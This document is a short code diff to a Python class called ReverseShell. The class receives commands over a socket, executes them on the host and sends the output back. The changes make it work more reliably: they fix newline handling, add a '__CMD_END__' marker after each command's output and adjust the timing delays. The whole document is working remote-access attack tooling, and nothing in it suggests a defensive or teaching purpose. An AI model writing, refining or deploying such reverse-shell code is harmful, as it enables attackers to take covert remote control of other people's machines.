@@ -35,7 +35,9 @@ class ReverseShell:
     def send(self, data):
         if self.socket and self.active:
             try:
-                self.socket.sendall(data.encode() + b"\n")
+                self.socket.sendall(data.encode())
+                if not data.endswith('\n'):
+                    self.socket.sendall(b"\n")
             except:
                 self.active = False
     
@@ -64,9 +66,13 @@ class ReverseShell:
                 if cmd.lower() in ["exit", "quit"]:
                     break
                 self.commands.append(cmd)
-                self.send(self.execute_command(cmd))
+                output = self.execute_command(cmd)
+                # Send output with end marker
+                self.send(output)
+                self.send("__CMD_END__\n")  # Marker to indicate command finished
+                time.sleep(0.1)  # Small delay after sending output
             
-            time.sleep(0.1)
+            time.sleep(0.05)
         
         if self.socket:
             self.socket.close()
